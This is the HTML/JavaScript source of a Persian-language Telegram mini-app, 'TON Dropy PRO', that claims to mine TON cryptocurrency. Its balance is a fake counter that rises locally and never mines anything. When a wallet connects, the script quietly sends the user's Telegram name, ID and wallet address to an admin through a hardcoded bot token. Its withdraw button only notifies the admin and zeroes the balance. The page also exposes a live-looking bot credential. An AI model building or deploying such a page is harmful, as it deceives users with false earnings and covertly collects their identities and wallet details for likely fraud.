<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<title>TON Dropy PRO - Final Official</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>

<style>
@import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;800&display=swap');

*{box-sizing:border-box; -webkit-tap-highlight-color: transparent;}

body{
    margin:0; font-family:'Vazirmatn',sans-serif;
    background: radial-gradient(circle at top,#0f1c2e,#070b14);
    color:#fff; padding:20px; user-select: none;
}

.header{text-align:center;margin-bottom:20px;}
.header h2{
    font-size:26px; font-weight: 800;
    background:linear-gradient(90deg,#00c6ff,#0072ff);
    -webkit-background-clip:text; -webkit-text-fill-color:transparent;
}

.card{
    background:rgba(255,255,255,0.05); backdrop-filter:blur(20px);
    border:1px solid rgba(255,255,255,0.1); padding:20px;
    border-radius:22px; margin-bottom:15px; text-align: center;
}

#balance {
    font-size: 34px; font-weight: 800; color: #00c6ff;
    display: block; margin: 10px 0;
    text-shadow: 0 0 20px rgba(0, 198, 255, 0.3);
}

.mining-info { font-size: 13px; color: #aaa; display: flex; justify-content: space-between; padding: 0 10px; }

button{
    width:100%; padding:16px; border:none; border-radius:16px;
    font-size:16px; font-weight:700; cursor:pointer; transition: 0.3s;
}

.withdraw-btn{
    background:linear-gradient(90deg,#ff512f,#dd2476);
    color:#fff; box-shadow: 0 5px 15px rgba(221, 36, 118, 0.3);
}

.withdraw-btn:disabled{ background: #333; color: #777; box-shadow: none; cursor: not-allowed; }

.toast{
    position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(100px);
    background:rgba(0, 198, 255, 0.9); color:#000; padding:12px 25px;
    border-radius:50px; font-weight: bold; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    opacity:0; z-index: 10000; font-size:14px;
}
.toast.show{ opacity:1; transform:translateX(-50%) translateY(0); }

.history-item{
    background:rgba(255,255,255,0.03); padding:12px; border-radius:14px;
    margin-top:10px; font-size:13px; border-right: 4px solid #00c6ff;
    display: flex; justify-content: space-between; align-items: center;
}

#ton-connect-button { display: flex; justify-content: center; margin: 5px 0; }
</style>
</head>

<body>

<div class="header">
    <h2>⛏ TON Dropy PRO</h2>
</div>

<div class="card">
    <p style="margin:0; color:#ccc;">موجودی زنده شما</p>
    <span id="balance">0.000000</span>
    <div class="mining-info">
        <span>⚡ 0.000012 TON/s</span>
        <span>🕒 <span id="clock">00:00:00</span></span>
    </div>
</div>

<div class="card">
    <div id="ton-connect-button"></div>
    <div id="walletBox" style="display:none; margin-top:15px; border-top: 1px solid rgba(255,255,255,0.1); pt:10px;">
        <p style="color:#00ff9d; font-size:12px; margin-bottom:5px;">✅ اتصال برقرار است</p>
        <code id="addrDisplay" style="font-size:10px; opacity:0.6; word-break:break-all;"></code>
    </div>
</div>

<div class="card">
    <button id="withdrawBtn" onclick="withdraw()" class="withdraw-btn">💸 ثبت درخواست برداشت</button>
</div>

<div class="card" style="text-align: right;">
    <h4 style="margin:0 0 10px 0;">📜 تاریخچه تراکنش‌ها</h4>
    <div id="history"></div>
</div>

<div id="toast" class="toast"></div>

<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// اطلاعات مدیریت (ثابت)
const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
const ADMIN_ID = "5972276401";
const STORAGE_KEY = "TON_DROPY_V5_MASTER";

// سیستم ماینینگ و حافظه
let miningRate = 0.000012;
let balance = parseFloat(localStorage.getItem(STORAGE_KEY)) || 0.0;

// نمایش ساعت
setInterval(() => {
    document.getElementById("clock").innerText = new Date().toLocaleTimeString("fa-IR");
}, 1000);

// شروع ماینینگ
function startEngine() {
    setInterval(() => {
        balance += miningRate;
        document.getElementById("balance").innerText = balance.toFixed(6);
        localStorage.setItem(STORAGE_KEY, balance.toString());
    }, 1000);
}

// تابع ارسال پیام به مدیریت
async function notifyAdmin(text) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'HTML' })
        });
    } catch(err) { console.error("Notify Error:", err); }
}

// پیکربندی اتصال به کیف پول (TON Connect)
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp/main/public/tonconnect-manifest.json',
    buttonRootId: 'ton-connect-button'
});

// مانیتور کردن وضعیت اتصال
tonConnectUI.onStatusChange(async (wallet) => {
    if (wallet) {
        const address = wallet.account.address;
        const walletName = wallet.device.appName || "نامشخص";
        
        document.getElementById("walletBox").style.display = "block";
        document.getElementById("addrDisplay").innerText = address;

        const user = tg.initDataUnsafe?.user;
        const msg = `🚀 <b>اتصال کیف پول جدید!</b>\n\n` +
                    `👛 اپلیکیشن: <b>${walletName}</b>\n` +
                    `👤 کاربر: ${user?.first_name || '؟'}\n` +
                    `🆔 آیدی: <code>${user?.id || '؟'}</code>\n` +
                    `🔗 آدرس:\n<code>${address}</code>`;
        
        notifyAdmin(msg);
        showToast(`کیف پول ${walletName} متصل شد`);
    } else {
        document.getElementById("walletBox").style.display = "none";
    }
});

// درخواست برداشت
async function withdraw() {
    if (!tonConnectUI.connected) {
        showToast("❌ ابتدا کیف پول را متصل کنید");
        return;
    }
    if (balance < 0.5) {
        showToast("❌ حداقل موجودی 0.5 TON");
        return;
    }

    const amount = balance.toFixed(6);
    const user = tg.initDataUnsafe?.user;
    const walletName = tonConnectUI.wallet?.device?.appName || "نامشخص";
    const address = tonConnectUI.account.address;

    const msg = `💰 <b>درخواست برداشت جدید!</b>\n\n` +
                `💵 مقدار: <b>${amount} TON</b>\n` +
                `👛 از: ${walletName}\n` +
                `👤 کاربر: ${user?.first_name}\n` +
                `🆔 آیدی: <code>${user?.id}</code>\n` +
                `🔗 آدرس: <code>${address}</code>`;

    await notifyAdmin(msg);

    // آپدیت ظاهر
    const div = document.createElement("div");
    div.className = "history-item";
    div.innerHTML = `<span>واریز ${amount} TON</span> <span style="color:#ffc107">در انتظار</span>`;
    document.getElementById("history").prepend(div);

    // صفر کردن موجودی
    balance = 0;
    localStorage.setItem(STORAGE_KEY, "0");
    showToast("📤 درخواست به مدیریت ارسال شد");
}

function showToast(msg) {
    const t = document.getElementById("toast");
    t.innerText = msg;
    t.classList.add("show");
    setTimeout(() => t.classList.remove("show"), 3000);
}

// اجرای برنامه
startEngine();
</script>

</body>
</html>
